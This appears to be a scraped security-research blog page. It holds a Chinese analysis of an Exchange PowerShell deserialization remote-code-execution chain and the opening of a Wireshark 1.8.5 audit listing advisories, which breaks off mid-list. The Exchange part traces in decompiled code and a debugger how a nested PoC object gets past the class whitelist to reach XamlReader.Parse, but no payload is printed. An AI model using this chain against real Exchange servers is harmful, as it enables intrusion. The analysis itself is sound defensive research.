Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35. PoC部分由两个对象嵌套而成，大致结构如下所示：\nObj V(System.ServiceProcess.ServiceController): String Name=\u0026#34;Type\u0026#34; Obj TargetTypeForDeserialization(System.Exception): ByteArray SerializationData String SerializationData 代码逻辑\n代码逻辑如下图\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\" standalone=\"no\"?\u003e\r\u003c!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd\"\u003e\r背景 1\rCenter Gradient\r页-1\r流程\rReadOneObject\rReadOneObject\t流程.8\rReadOneDeserializedObject 遍历XML树的标签\rReadOneDeserializedObject遍历XML树的标签\t动态连接线\r调用读取一个反序列化对象 object obj = this.ReadOneDeserializedObject\r调用，读取一个反序列化对象object obj = this.ReadOneDeserializedObject\t动态连接线.12\r碰到Obj标签调用读取一个Obj对象 if (this.IsNextElement(\u0026#34;Obj\u0026#34;)){ return thi...\r碰到Obj标签，调用，读取一个Obj对象if (this.IsNextElement(\u0026#34;Obj\u0026#34;)){return this.ReadPSObject();}\t流程.11\rReadPSObject 读取一个Obj对象\rReadPSObject读取一个Obj对象\t动态连接线.14\r碰到Props标签调用读取Props标签 if (this.IsNextElement(\u0026#34;Props\u0026#34;)){ this.R...\r碰到Props标签，调用，读取Props标签if (this.IsNextElement(\u0026#34;Props\u0026#34;)){this.ReadProperties(psobject);}\t流程.13\rReadProperties\rReadProperties\t动态连接线.16\r调用读取嵌套对象\r调用，读取嵌套对象\t流程.15\rReadOneObject\rReadOneObject\t动态连接线.20\r调用将反序列化数据 转换为目标类型此时目标类型为System.Exception\r调用，将反序列化数据转换为目标类型，此时目标类型为System.Exception\t流程.19\rConvertTo\rConvertTo\t动态连接线.22\r一系列调用\r一系列调用\t流程.21\rObject.Reader.Deserialize\rObject.Reader.Deserialize\t动态连接线.24\r调用解析内存中的序列化数据\r调用，解析内存中的序列化数据\t流程.23\r__BinaryParser.Run\r__BinaryParser.Run\t动态连接线.28\r流程.27\r将序列化数据解析为System.UnitySerializationHolder对象并载入m_assmblyName对应的...\r将序列化数据解析为System.UnitySerializationHolder对象，并载入m_assmblyName对应的DLL\t动态连接线.39\r流程.38\r转化为在m_assmblyName对应的DLL中的m_data对应类型的Type对象\r转化为在m_assmblyName对应的DLL中的m_data对应类型的Type对象\t动态连接线.41\r一系列返回\r一系列返回\t动态连接线.43\r流程.42\r将ConverTo返回的Type对象加入.adaptedMembers\r将ConverTo返回的Type对象加入.adaptedMembers\t流程.45\rGetTargetTypeForDeserialization\rGetTargetTypeForDeserialization\t流程.53\rReadOneDeserializedObject\rReadOneDeserializedObject\t流程.54\rReadOneObject\rReadOneObject\t动态连接线.56\r动态连接线.57\r动态连接线.58\r动态连接线.59\r调用\r调用\t动态连接线.61\r流程.60\rGetPSStandardMember\rGetPSStandardMember\t动态连接线.63\r流程.62\r读取adaptedMembers的TargetTypeForDeserialization并返回\r读取adaptedMembers的TargetTypeForDeserialization并返回\t动态连接线.66\r调用将外层对象序列化数据\r调用，将外层对象序列化数据\t流程.65\rLanguagePrimitives.ConvertTo\rLanguagePrimitives.ConvertTo\t动态连接线.69\r流程.68\r将S标签内数据转换为XamlReader对象触发代码执行\r将S标签内数据转换为XamlReader对象，触发代码执行\t在Exchange中，允许反序列化的类白名单和类反序列化相关信息定义在exchange.partial.types.ps1xml和exchange.types.ps1xml等文件中，Exchange会读取这些文件，在反序列化数据时，会payload里面的目标类和文件里面的白名单类做对比，只有在白名单内的类才允许反序列化。\nPoC由嵌套对象组成，在反序列化嵌套对象时，会先反序列化里层对象，而后反序列化外层对象。在Exchang反序列化PoC的里层对象时，将通过ConvertTo函数转换到目标类，传给ConvertTo的resultType值为System.Exception，System.Exception在exchange.partial.types.ps1xml中定义如下：\n\u0026lt;Type\u0026gt; \u0026lt;Name\u0026gt;System.Exception\u0026lt;/Name\u0026gt; \u0026lt;Members\u0026gt; \u0026lt;CodeProperty IsHidden=\u0026#34;true\u0026#34;\u0026gt; \u0026lt;Name\u0026gt;SerializationData\u0026lt;/Name\u0026gt; \u0026lt;GetCodeReference\u0026gt; \u0026lt;TypeName\u0026gt;Microsoft.Exchange.Data.SerializationTypeConverter\u0026lt;/TypeName\u0026gt; \u0026lt;MethodName\u0026gt;GetSerializationData\u0026lt;/MethodName\u0026gt; \u0026lt;/GetCodeReference\u0026gt; \u0026lt;/CodeProperty\u0026gt; \u0026lt;/Members\u0026gt; \u0026lt;TypeConverter\u0026gt; \u0026lt;TypeName\u0026gt;Microsoft.Exchange.Data.SerializationTypeConverter\u0026lt;/TypeName\u0026gt; \u0026lt;/TypeConverter\u0026gt; \u0026lt;/Type\u0026gt; internal static object ConvertTo(object valueToConvert, Type resultType, bool recursion, IFormatProvider formatProvider, TypeTable backupTypeTable) { object result; using (LanguagePrimitives.typeConversion.TraceScope(\u0026#34;Converting \\\u0026#34;{0}\\\u0026#34; to \\\u0026#34;{1}\\\u0026#34;.\u0026#34;, valueToConvert, resultType)) { if (resultType == null) { throw PSTraceSource.NewArgumentNullException(\u0026#34;resultType\u0026#34;); } bool flag; result = LanguagePrimitives.FigureConversion(valueToConvert, resultType, out flag).Invoke(flag ? PSObject.Base(valueToConvert) : valueToConvert, resultType, recursion, flag ? ((PSObject)valueToConvert) : null, formatProvider, backupTypeTable); } return result; } 其定义了*\u0026lt;TypeName\u0026gt;Microsoft.Exchange.Data.SerializationTypeConverter\u0026lt;/TypeName\u0026gt;，Exchange将通过Microsoft.Exchange.Data.SerializationTypeConverter*类对里层序列化数据进行反序列化。Microsoft.Exchange.Data.SerializationTypeConverter经过一系列调用，最终由System.Runtime.Serialization.Formatters.Binary.ObjectReader.Deserialize方法进行反序列化。\n在该方法会调用System.Runtime.Serialization.Formatters.Binary.__BinaryParser.Run，这方法会循环读取内存中的里层对象的序列化数据，将其转换为System.UnitySerializationHolder对象。\n之后Exchange会通过Assembly.LoadFrom载入*System.UnitySerializationHolder.m_assemblyName所指明的DLL，并且返回System.UnitySerializationHolder.m_data*类型的Type对象。\ninternal object Deserialize(HeaderHandler handler, __BinaryParser serParser, bool fCheck, bool isCrossAppDomain, IMethodCallMessage methodCallMessage) { ...... serParser.Run(); ...... if (!this.bMethodCall \u0026amp;\u0026amp; !this.bMethodReturn) { if (this.TopObject == null) { throw new SerializationException(Environment.GetResourceString(\u0026#34;Serialization_TopObject\u0026#34;)); } if (this.HasSurrogate(this.TopObject.GetType()) \u0026amp;\u0026amp; this.topId != 0L) { this.TopObject = this.m_objectManager.GetObject(this.topId); } if (this.TopObject is IObjectReference) { this.TopObject = ((IObjectReference)this.TopObject).GetRealObject(this.m_context); } } if (this.bFullDeserialization) { this.m_objectManager.RaiseDeserializationEvent(); } if (handler != null) { this.handlerObject = handler(this.headers); } if (this.bMethodCall) { object[] callA = this.TopObject as object[]; this.TopObject = this.binaryMethodCall.ReadArray(callA, this.handlerObject); } else if (this.bMethodReturn) { object[] returnA = this.TopObject as object[]; this.TopObject = this.binaryMethodReturn.ReadArray(returnA, methodCallMessage, this.handlerObject); } return this.TopObject; } 在一系列函数调用返回后，System.Management.Automation.InternalDeserializer.ReadProperties会将System.Runtime.Serialization.Formatters.Binary.ObjectReader.Deserialize返回的对象添加到PSObject.adaptedMembers中，需要注意的是该对象变量名为TargetTypeForDeserialization。\nprivate void ReadProperties(PSObject dso) { dso.isDeserialized = true; dso.adaptedMembers = new PSMemberInfoInternalCollection\u0026lt;PSPropertyInfo\u0026gt;(); dso.InstanceMembers.Add(PSObject.dotNetInstanceAdapter.GetDotNetMethod\u0026lt;PSMemberInfo\u0026gt;(dso, \u0026#34;GetType\u0026#34;)); PSGetMemberBinder.SetHasInstanceMember(\u0026#34;GetType\u0026#34;); dso.clrMembers = new PSMemberInfoInternalCollection\u0026lt;PSPropertyInfo\u0026gt;(); if (this.ReadStartElementAndHandleEmpty(\u0026#34;Props\u0026#34;)) { while (this._reader.NodeType == XmlNodeType.Element) { string name = this.ReadNameAttribute(); object serializedValue = this.ReadOneObject(); PSProperty member = new PSProperty(name, serializedValue); dso.adaptedMembers.Add(member); } this.ReadEndElement(); } } 在反序列化外层对象时，ReadOneObject会调用GetTargetTypeForDeserialization获取反序列化的目标类型，并通过ConvertTo转化为该对象。\n在GetTargetTypeForDeserialization函数中，将会调用GetPSStandardMember并传入硬编码的TargetTypeForDeserialization，在GetPSStandardMember中会通过TypeTableGetMemberDelegate创建成员集合，其中包括子类的成员属性，而后匹配其中的memberName项对应的值并返回。此时获取的值为XamlReader类型的Type对象。\ninternal Type GetTargetTypeForDeserialization(TypeTable backupTypeTable) { PSMemberInfo psstandardMember = this.GetPSStandardMember(backupTypeTable, \u0026#34;TargetTypeForDeserialization\u0026#34;); if (psstandardMember != null) { return psstandardMember.Value as Type; } return null; } internal PSMemberInfo GetPSStandardMember(TypeTable backupTypeTable, string memberName) { PSMemberInfo psmemberInfo = null; TypeTable typeTable = (backupTypeTable != null) ? backupTypeTable : this.GetTypeTable(); if (typeTable != null) { PSMemberSet psmemberSet = PSObject.TypeTableGetMemberDelegate\u0026lt;PSMemberSet\u0026gt;(this, typeTable, \u0026#34;PSStandardMembers\u0026#34;); if (psmemberSet != null) { psmemberSet.ReplicateInstance(this); psmemberInfo = new PSMemberInfoIntegratingCollection\u0026lt;PSMemberInfo\u0026gt;(psmemberSet, PSObject.GetMemberCollection(PSMemberViewTypes.All, backupTypeTable))[memberName]; } } if (psmemberInfo == null) { psmemberInfo = (this.InstanceMembers[\u0026#34;PSStandardMembers\u0026#34;] as PSMemberSet); } return psmemberInfo; } 外层类类型定义为System.ServiceProcess.ServiceController，其定义在types.ps1xml文件内，定义如下。\n\u0026lt;Type\u0026gt; \u0026lt;Name\u0026gt;System.ServiceProcess.ServiceController\u0026lt;/Name\u0026gt; \u0026lt;Members\u0026gt; \u0026lt;MemberSet\u0026gt; \u0026lt;Name\u0026gt;PSStandardMembers\u0026lt;/Name\u0026gt; \u0026lt;Members\u0026gt; \u0026lt;PropertySet\u0026gt; \u0026lt;Name\u0026gt;DefaultDisplayPropertySet\u0026lt;/Name\u0026gt; \u0026lt;ReferencedProperties\u0026gt; \u0026lt;Name\u0026gt;Status\u0026lt;/Name\u0026gt; \u0026lt;Name\u0026gt;Name\u0026lt;/Name\u0026gt; \u0026lt;Name\u0026gt;DisplayName\u0026lt;/Name\u0026gt; \u0026lt;/ReferencedProperties\u0026gt; \u0026lt;/PropertySet\u0026gt; \u0026lt;/Members\u0026gt; \u0026lt;/MemberSet\u0026gt; \u0026lt;AliasProperty\u0026gt; \u0026lt;Name\u0026gt;Name\u0026lt;/Name\u0026gt; \u0026lt;ReferencedMemberName\u0026gt;ServiceName\u0026lt;/ReferencedMemberName\u0026gt; \u0026lt;/AliasProperty\u0026gt; \u0026lt;AliasProperty\u0026gt; \u0026lt;Name\u0026gt;RequiredServices\u0026lt;/Name\u0026gt; \u0026lt;ReferencedMemberName\u0026gt;ServicesDependedOn\u0026lt;/ReferencedMemberName\u0026gt; \u0026lt;/AliasProperty\u0026gt; \u0026lt;ScriptMethod\u0026gt; \u0026lt;Name\u0026gt;ToString\u0026lt;/Name\u0026gt; \u0026lt;Script\u0026gt; $this.ServiceName \u0026lt;/Script\u0026gt; \u0026lt;/ScriptMethod\u0026gt; \u0026lt;/Members\u0026gt; \u0026lt;/Type\u0026gt; 在GetPSStandardMember函数会试图获取System.ServiceProcess.ServiceController类的TargetTypeForDeserialization（传入的硬编码参数）属性，但其在文件内没有定义默认的TargetTypeForDeserialization值，所以外层类的members内没有TargetTypeForDeserialization名字的值，Exchange将试图从子类的members属性中检索TargetTypeForDeserialization名字的值，前面说过在对内层对象反序列化时，通过ReadProperties将名为TargetTypeForDeserialization的XamlReader类型的Type对象添加到了adaptedMembers中，此时Exchange将会检索到该对象并返回。\n获取到targetTypeForDeserialization之后，ReadOneObject调用LanguagePrimitives.ConvertTo将序列化数据转换为targetTypeForDeserialization(XamlReader)。\ninternal object ReadOneObject(out string streamName) { .... object obj = this.ReadOneDeserializedObject(out streamName, out flag); ..... Type targetTypeForDeserialization = psobject.GetTargetTypeForDeserialization(this._typeTable); .... object obj2 = LanguagePrimitives.ConvertTo(obj, targetTypeForDeserialization, true, CultureInfo.InvariantCulture, this._typeTable); ..... } ConvertTo函数会进行如下调用链，通过反射获取到XamlReader类的Parse方法后，将其调用，成功执行代码。\n调试 使用dnsPy附加到下面的进程\nc:\\windows\\system32\\inetsrv\\w3wp.exe -ap \u0026#34;MSExchangePowerShellAppPool\u0026#34; -v \u0026#34;v4.0\u0026#34; -c \u0026#34;C:\\Program Files\\Microsoft\\Exchange Server\\V15\\bin\\GenericAppPoolConfigWithGCServerEnabledFalse.config\u0026#34; -a \\\\.\\pipe\\iisipm319caf0c-5de0-4833-8a04-4b28f4a836ae -h \u0026#34;C:\\inetpub\\temp\\apppools\\MSExchangePowerShellAppPool\\MSExchangePowerShellAppPool.config\u0026#34; -w \u0026#34;\u0026#34; -m 0 在以下几个地方下断点\nSystem.Runtime.Serialization.Formatters.Binary ObjectReader.Deserialize 发送PoC，调试器在断点处断下，此时调用栈如下:\n此时为Exchange试图将Props标签内的序列化数据通过ConvertTo函数转化为System.Exception对象，System.Runtime.Serialization.Formatters.Binary.ObjectReader.Deserialize会通过serParser.Run()解析读入内存中的base64解码数据。\ninternal object Deserialize(HeaderHandler handler, __BinaryParser serParser, bool fCheck, bool isCrossAppDomain, IMethodCallMessage methodCallMessage) { ..... serParser.Run(); if (this.bFullDeserialization) { this.m_objectManager.DoFixups(); } if (!this.bMethodCall \u0026amp;\u0026amp; !this.bMethodReturn) { if (this.TopObject == null) { throw new SerializationException(Environment.GetResourceString(\u0026#34;Serialization_TopObject\u0026#34;)); } if (this.HasSurrogate(this.TopObject.GetType()) \u0026amp;\u0026amp; this.topId != 0L) { this.TopObject = this.m_objectManager.GetObject(this.topId); } if (this.TopObject is IObjectReference) { this.TopObject = ((IObjectReference)this.TopObject).GetRealObject(this.m_context); } } if (this.bFullDeserialization) { this.m_objectManager.RaiseDeserializationEvent(); } if (handler != null) { this.handlerObject = handler(this.headers); } if (this.bMethodCall) { object[] callA = this.TopObject as object[]; this.TopObject = this.binaryMethodCall.ReadArray(callA, this.handlerObject); } else if (this.bMethodReturn) { object[] returnA = this.TopObject as object[]; this.TopObject = this.binaryMethodReturn.ReadArray(returnA, methodCallMessage, this.handlerObject); } return this.TopObject; } serParser.Run()会将内存序列化数据试图转化为System.UnitySerializationHolder 对象，代码如下，通过循环读取各个标志位调用不同方法从内存中读取指定类型的数据。构造出System.UnitySerializationHolder对象并载入System.UnitySerializationHolder.AssemblyName对应的DLL。\ninternal void Run() { try { bool flag = true; this.ReadBegin(); this.ReadSerializationHeaderRecord(); while (flag) { BinaryHeaderEnum binaryHeaderEnum = BinaryHeaderEnum.Object; BinaryTypeEnum binaryTypeEnum = this.expectedType; if (binaryTypeEnum != BinaryTypeEnum.Primitive) { if (binaryTypeEnum - BinaryTypeEnum.String \u0026gt; 6) { throw new SerializationException(Environment.GetResourceString(\u0026#34;Serialization_TypeExpected\u0026#34;)); } byte b = this.dataReader.ReadByte(); binaryHeaderEnum = (BinaryHeaderEnum)b; switch (binaryHeaderEnum) { case BinaryHeaderEnum.Object: this.ReadObject(); break; case BinaryHeaderEnum.ObjectWithMap: ..... this.ReadObjectWithMap(binaryHeaderEnum); break; case BinaryHeaderEnum.ObjectWithMapTyped: ...... this.ReadObjectWithMapTyped(binaryHeaderEnum); break; case BinaryHeaderEnum.ObjectString: ...... this.ReadObjectString(binaryHeaderEnum); break; case BinaryHea......flag2) { ObjectProgress objectProgress = (ObjectProgress)this.stack.Peek(); if (objectProgress == null) { this.expectedType = BinaryTypeEnum.ObjectUrt; this.expectedTypeInformation = null; flag2 = true; } else { flag2 = objectProgress.GetNext(out objectProgress.expectedType, out objectProgress.expectedTypeInformation); this.expectedType = objectProgress.expectedType; this.expectedTypeInformation = objectProgress.expectedTypeInformation; if (!flag2) { this.prs.Init(); if (objectProgress.memberValueEnum == InternalMemberValueE.Nested) { this.prs.PRparseTypeEnum = InternalParseTypeE.MemberEnd; this.prs.PRmemberTypeEnum = objectProgress.memberTypeEnum; this.prs.PRmemberValueEnum = objectProgress.memberValueEnum; this.objectReader.Parse(this.prs); } else { this.prs.PRparseTypeEnum = InternalParseTypeE.ObjectEnd; this.prs.PRmemberTypeEnum = objectProgress.memberTypeEnum; this.prs.PRmemberValueEnum = objectProgress.memberValueEnum; this.objectReader.Parse(this.prs); } this.stack.Pop(); this.PutOp(objectProgress); } } } } } } ...... } 将XamlReader读入内存\n在System.Runtime.Serialization.Formatters.Binary.ObjectReader.Deserialize中将通过\nthis.TopObject = ((IObjectReference)this.TopObject).GetRealObject(this.m_context); 将System.UnitySerializationHolder转化为Type类型的XamlReader对象，并通过反射获取了XamlReader类的各个属性。\n在最后将this.TopObject作为返回值返回，在经过一系列函数调用返回后，可以在调试器看到ConvertTo函数返回了Object类型对象obj2，可以看到其为类型为Type类型的XamlReader对象，之后ReadOneObject返回该对象。\n注：Type类型是Exchange内定义的抽象类，如下所示：\nnamespace System { // Token: 0x02000148 RID: 328 [ClassInterface(ClassInterfaceType.None)] [ComDefaultInterface(typeof(_Type))] [ComVisible(true)] [__DynamicallyInvokable] [Serializable] public abstract class Type : MemberInfo, _Type, IReflect { // Token: 0x17000217 RID: 535 // (get) Token: 0x060013E6 RID: 5094 RVA: 0x0003BE2A File Offset: 0x0003A02A public override MemberTypes MemberType { get { return MemberTypes.TypeInfo; } } (应该可以理解obj2为实现了Type这个抽象类的XamlReader对象，而XamlReader继承了Object这个父类，所以可以使用Object类型对象接受)\n在调用栈内，ReadOneObject由ReadProperties调用，回到ReadProperties逻辑中，Exchange会将ReadOneObject返回的的Type类型的XamlReader对象添加到dso.adaptedMembers中，而后这个dso将会返回到调用栈内的ReadOneObject函数。\n继续调试，此时嵌套对象的内层对象已反序列化，开始反序列化外层对象，回到程序中，从下图可以看到，将会调用psobject.GetTargetTypeForDeserialization获取目标反序列化类型，此时psobject内的adaptedMembers内有名为TargetTypeForDeserialization的对象，其类型为Type的XamlReader对象\n进入到psobject.GetTargetTypeForDeserialization内，调用this.GetPSStandardMember试图获取PSMemberInfo 对象，而后将其强转为Type对象返回，若失败则返回null\ninternal Type GetTargetTypeForDeserialization(TypeTable backupTypeTable) { PSMemberInfo psstandardMember = this.GetPSStandardMember(backupTypeTable, \u0026#34;TargetTypeForDeserialization\u0026#34;); if (psstandardMember != null) { return psstandardMember.Value as Type; } return null; } 在GetPSStandardMember函数内，调用PSObject.TypeTableGetMemberDelegate并传入当前对象、允许的类型列表和硬编码PSStandardMembers以初始化PSMemberSet 对象。\ninternal PSMemberInfo GetPSStandardMember(TypeTable backupTypeTable, string memberName) { PSMemberInfo psmemberInfo = null; TypeTable typeTable = (backupTypeTable != null) ? backupTypeTable : this.GetTypeTable(); if (typeTable != null) { PSMemberSet psmemberSet = PSObject.TypeTableGetMemberDelegate\u0026lt;PSMemberSet\u0026gt;(this, typeTable, \u0026#34;PSStandardMembers\u0026#34;); if (psmemberSet != null) { psmemberSet.ReplicateInstance(this); psmemberInfo = new PSMemberInfoIntegratingCollection\u0026lt;PSMemberInfo\u0026gt;(psmemberSet, PSObject.GetMemberCollection(PSMemberViewTypes.All, backupTypeTable))[memberName]; } } if (psmemberInfo == null) { psmemberInfo = (this.InstanceMembers[\u0026#34;PSStandardMembers\u0026#34;] as PSMemberSet); } return psmemberInfo; } 而后调用PSMemberInfoIntegratingCollection构造函数，其中PSMemberInfoIntegratingCollection类继承了PSMemberInfo类。传入构造函数的collections变量来源于PSObject.GetMemberCollection(PSMemberViewTypes.All, backupTypeTable) 函数的返回值，构造函数将collections赋给当前对象的collections属性。\ninternal class PSMemberInfoIntegratingCollection\u0026lt;T\u0026gt; : PSMemberInfoCollection\u0026lt;T\u0026gt;, IEnumerable\u0026lt;T\u0026gt;, IEnumerable where T : PSMemberInfo { // Token: 0x06002AC3 RID: 10947 RVA: 0x000C35F4 File Offset: 0x000C17F4 private void GenerateAllReservedMembers() { if (!this.mshOwner.hasGeneratedReservedMembers) { this.mshOwner.hasGeneratedReservedMembers = true; ReservedNameMembers.GeneratePSExtendedMemberSet(this.mshOwner); ReservedNameMembers.GeneratePSBaseMemberSet(this.mshOwner); ReservedNameMembers.GeneratePSObjectMemberSet(this.mshOwner); ReservedNameMembers.GeneratePSAdaptedMemberSet(this.mshOwner); ReservedNameMembers.GeneratePSTypeNames(this.mshOwner); } } internal PSMemberInfoIntegratingCollection(object owner, Collection\u0026lt;CollectionEntry\u0026lt;T\u0026gt;\u0026gt; collections) { if (owner == null) { throw PSTraceSource.NewArgumentNullException(\u0026#34;owner\u0026#34;); } this.mshOwner = (owner as PSObject); this.memberSetOwner = (owner as PSMemberSet); if (this.mshOwner == null \u0026amp;\u0026amp; this.memberSetOwner == null) { throw PSTraceSource.NewArgumentException(\u0026#34;owner\u0026#34;); } if (collections == null) { throw PSTraceSource.NewArgumentNullException(\u0026#34;collections\u0026#34;); } this.collections = collections; } GetMemberCollection代码如下，其会将对象的adaptedMembers属性添加到列表中，而在内层对象反序列化时已经将名为TargetTypeForDeserialization的XamlReader类型的Type对象加入到adaptedMembers属性中。所以返回的列表内也会包含该对象。\ninternal static Collection\u0026lt;CollectionEntry\u0026lt;PSMemberInfo\u0026gt;\u0026gt; GetMemberCollection(PSMemberViewTypes viewType, TypeTable backupTypeTable) { Collection\u0026lt;CollectionEntry\u0026lt;PSMemberInfo\u0026gt;\u0026gt; collection = new Collection\u0026lt;CollectionEntry\u0026lt;PSMemberInfo\u0026gt;\u0026gt;(); if ((viewType \u0026amp; PSMemberViewTypes.Extended) == PSMemberViewTypes.Extended) { if (backupTypeTable == null) { collection.Add(new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;(new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;.GetMembersDelegate(PSObject.TypeTableGetMembersDelegate\u0026lt;PSMemberInfo\u0026gt;), new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;.GetMemberDelegate(PSObject.TypeTableGetMemberDelegate\u0026lt;PSMemberInfo\u0026gt;), true, true, \u0026#34;type table members\u0026#34;)); } else { collection.Add(new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;((PSObject msjObj) =\u0026gt; PSObject.TypeTableGetMembersDelegate\u0026lt;PSMemberInfo\u0026gt;(msjObj, backupTypeTable), (PSObject msjObj, string name) =\u0026gt; PSObject.TypeTableGetMemberDelegate\u0026lt;PSMemberInfo\u0026gt;(msjObj, backupTypeTable, name), true, true, \u0026#34;type table members\u0026#34;)); } } if ((viewType \u0026amp; PSMemberViewTypes.Adapted) == PSMemberViewTypes.Adapted) { **collection.Add(new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;(new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;.GetMembersDelegate(PSObject.AdapterGetMembersDelegate\u0026lt;PSMemberInfo\u0026gt;), new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;.GetMemberDelegate(PSObject.AdapterGetMemberDelegate\u0026lt;PSMemberInfo\u0026gt;), false, false, \u0026#34;adapted members\u0026#34;));** } if ((viewType \u0026amp; PSMemberViewTypes.Base) == PSMemberViewTypes.Base) { collection.Add(new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;(new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;.GetMembersDelegate(PSObject.DotNetGetMembersDelegate\u0026lt;PSMemberInfo\u0026gt;), new CollectionEntry\u0026lt;PSMemberInfo\u0026gt;.GetMemberDelegate(PSObject.DotNetGetMemberDelegate\u0026lt;PSMemberInfo\u0026gt;), false, false, \u0026#34;clr members\u0026#34;)); } return collection; } private static T AdapterGetMemberDelegate\u0026lt;T\u0026gt;(PSObject msjObj, string name) where T : PSMemberInfo { if (!msjObj.isDeserialized) { T t = msjObj.InternalAdapter.BaseGetMember\u0026lt;T\u0026gt;(msjObj.immediateBaseObject, name); PSObject.memberResolution.WriteLine(\u0026#34;Adapted member: {0}.\u0026#34;, (t == null) ? \u0026#34;not found\u0026#34; : t.Name); return t; } if (msjObj.adaptedMembers == null) { return default(T); } T t2 = msjObj.adaptedMembers[name] as T; PSObject.memberResolution.WriteLine(\u0026#34;Serialized adapted member: {0}.\u0026#34;, (t2 == null) ? \u0026#34;not found\u0026#34; : t2.Name); return t2; } 返回到GetPSStandardMember函数中，Exchange会匹配构造函数返回的对象的memberName属性，该属性来源于GetTargetTypeForDeserialization调用时传递的硬编码TargetTypeForDeserialization，即将从该对象中检索名为TargetTypeForDeserialization的值，前面提到过列表内已有该名字的对象，所以将匹配到XamlReader类型的Type对象，并返回给上层函数。\n返回到上层函数，GetTargetTypeForDeserialization返回了XamlReader类型。\n进入到ConvertTo函数内，valueToConvert为上层函数ReadOneObject函数传入的obj对象，其内包含了xaml反序列化的命令执行字符串。\n进入到LanguagePrimitives.FigureConversion在#3527处断点，此时fromType为String，toType为XamlReader\n进入FigureParseConversion内，将会通过反射获取到XamlReader的Parse方法。\nprivate static LanguagePrimitives.PSConverter\u0026lt;object\u0026gt; FigureParseConversion(Type fromType, Type toType) { ..... else if (fromType == typeof(string)) { MethodInfo methodInfo = null; try { methodInfo = toType.GetMethod(\u0026#34;Parse\u0026#34;, BindingFlags.Static | BindingFlags.Public | BindingFlags.FlattenHierarchy, null, new Type[] { typeof(string), typeof(IFormatProvider) }, null); } catch (AmbiguousMatchException ex) { LanguagePrimitives.typeConversion.WriteLine(\u0026#34;Exception finding Parse method with CultureInfo: \\\u0026#34;{0}\\\u0026#34;.\u0026#34;, ex.Message); } catch (ArgumentException ex2) { LanguagePrimitives.typeConversion.WriteLine(\u0026#34;Exception finding Parse method with CultureInfo: \\\u0026#34;{0}\\\u0026#34;.\u0026#34;, ex2.Message); } if (methodInfo != null) { return new LanguagePrimitives.PSConverter\u0026lt;object\u0026gt;(new LanguagePrimitives.ConvertViaParseMethod { parse = methodInfo }.ConvertWithCulture); } try { methodInfo = toType.GetMethod(\u0026#34;Parse\u0026#34;, BindingFlags.Static | BindingFlags.Public | BindingFlags.FlattenHierarchy, null, new Type[] { typeof(string) }, null); } catch (AmbiguousMatchException ex3) { LanguagePrimitives.typeConversion.WriteLine(\u0026#34;Exception finding Parse method: \\\u0026#34;{0}\\\u0026#34;.\u0026#34;, ex3.Message); } catch (ArgumentException ex4) { LanguagePrimitives.typeConversion.WriteLine(\u0026#34;Exception finding Parse method: \\\u0026#34;{0}\\\u0026#34;.\u0026#34;, ex4.Message); } if (methodInfo != null) { return new LanguagePrimitives.PSConverter\u0026lt;object\u0026gt;(new LanguagePrimitives.ConvertViaParseMethod { parse = methodInfo }.ConvertWithoutCulture); } } return null; } XamlReader.Parse方法将会由LanguagePrimitives.ConvertViaParseMethod.ConvertWithoutCulture方法调用。之后就是普通的反序列化过程了。\n小结 这个漏洞利用链核心是如何绕过Exchange黑名单类并使Exchange将攻击者控制的指定数据反序列化到指定危险类造成代码执行。\n漏洞利用了Exchange的合法功能，先构造了名为targetTypeForDeserialization 的XamlReader类型的Type对象序列化值，利用Microsoft.Exchange.Data.SerializationTypeConverter的特性返回了XamlReader类型的Type对象，而后ReadProperties将其加入到adaptedMember内。在外层对象反序列化时，构造的PSMembers包含了名为targetTypeForDeserialization的XamlReader类型的Type对象，Exchange会在PSMembers列表内匹配targetTypeForDeserialization项，从而控制了ConvertTo函数转化的目标类XamlReader，Exchange通过反射获取到了XamlReader的Parse方法，调用该方法反序列化攻击者可控的序列化数据，触发代码执行。\n在调试过程中需要将.NET Framework的优化关掉以便dnSpy调试\n[.NET Framework Debugging Control] GenerateTrackingInfo=1 AllowOptimize=0 COMPlus_ZapDisable=1 COMPlus_ReadyToRun=0 其他\nPSRP：PowerShell Remote Protocol powerShell远程协议，是微软提供的通过SOAP协议上执行PowerShell代码的协议\n参考资料\nhttps://www.zerodayinitiative.com/blog/2022/11/14/control-your-types-or-get-pwned-remote-code-execution-in-exchange-powershell-backend\nhttps://www.zerodayinitiative.com/blog/2021/8/17/from-pwn2own-2021-a-new-attack-surface-on-microsoft-exchange-proxyshell\nCreated at 2023-05-05T20:35:49+08:00\n"},{"uri":"https://www.ch35tnut.site/zh-cn/research/code-audit/wireshark-185/","title":"Wireshark 1.8.5代码审计","tags":[],"description":"","content":"通过爬取wireshark的漏洞公告页面，筛选1.8.6修复的漏洞可以得到如下结果：\n1.8.6/1.8.7修复的漏洞\nwnpa-sec-2013-31. ETCH dissector large loop. Fixed in 1.8.7.\nThe ETCH dissector could go into a large loop. Discovered by Moshe Kaplan.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-30. MySQL dissector infinite loop. Fixed in 1.8.7.\nThe MySQL dissector could go into an infinite loop. Discovered by Moshe Kaplan.It may be possible to make Wireshark consume excessive CPU resources by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-29. Websocket dissector crash. Fixed in 1.8.7.\nThe Websocket dissector could crash. Discovered by Moshe Kaplan.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-28. MPEG DSM-CC dissector crash. Fixed in 1.8.7.\nThe MPEG DSM-CC dissector could crash.It may be possible to make Wireshark crash by injecting a malformed packet onto the wire or by convincing someone to read a malformed packet trace file.\nwnpa-sec-2013-27. DCP ETSI dissector crash. Fixed in 1.8.7.\nThe DCP ETSI dissector could crash. Discovered by Evan Jensen.It may be possible to make Wireshark crash by injecting a malformed packet 